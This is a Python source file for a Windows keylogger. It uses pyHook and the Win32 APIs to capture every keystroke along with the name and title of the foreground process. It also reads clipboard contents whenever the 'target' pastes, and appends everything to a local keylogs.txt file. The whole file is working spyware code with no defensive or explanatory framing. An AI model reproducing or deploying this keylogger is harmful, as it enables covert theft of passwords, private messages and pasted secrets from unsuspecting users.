
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
# import win32gui
from win32com.makegw.makegwparse import *

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None



def get_current_process():
    #Get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    print("hwnd",hwnd)
    #Find Process id
    pid = c_ulong()
    print("pid",pid)
    user32.GetWindowThreadProcessId(hwnd ,byref(pid))
    #store the current process ID
    process_id = pid.value
    print("processid",process_id)
    #grab the executable
    executable = create_string_buffer (b'\x00',512)
    h_process = kernel32.OpenProcess(0x400 | 0x10 ,False ,pid)
    psapi.GetModuleBaseNameA(h_process ,None ,byref(executable) ,512)
    #now read its title
    window_title = create_string_buffer(b"\x00",512)
    print(window_title , executable ,process_id ,hwnd)
    length = user32.GetWindowTextA(hwnd ,byref(window_title) ,512)

    # w = win32gui
    # z=w.GetWindowText(w.GetForegroundWindow())
    #print out the header if we're in the right process
    print()
    print("PID : %s - %s - %s"%(process_id,executable.value ,window_title.value))
    var = "PID : %s - %s - %s"%(process_id,executable.value ,window_title.value)
    file = open("keylogs.txt", 'a')
    file.write("\n%s\n"%var)
    file.close()
    print()
    #close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
def Keystroke(event ):
    global current_window
    #check to see if target changed windows
    if event.WindowName != current_window :
        current_window = event.WindowName
        get_current_process()
    #if they pressed a standard key
    if event.Ascii in range(32 ,128) :
        print(chr(event.Ascii))
        h = chr(event.Ascii)
        file = open("keylogs.txt", 'a')
        file.write("%s"%h)
        file.close()
    else :
        #if [CTRL-V] ,get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - {0}".format(pasted_value))
            file =open("keylogs.txt" ,'a')
            file.write("\n[PASTE] - {0}\n".format(pasted_value))
            file.close()
        else :
            print("{0}".format(event.Key))
            file = open("keylogs.txt", 'a')
            file.write("{0}".format(event.Key))
            file.close()
    #pass execution to next hook registered
    return True


#create and register a hook manager
k1 = pyHook.HookManager()
k1.KeyDown = Keystroke
#register the hook and execute forever
k1.HookKeyboard()
pythoncom.PumpMessages()
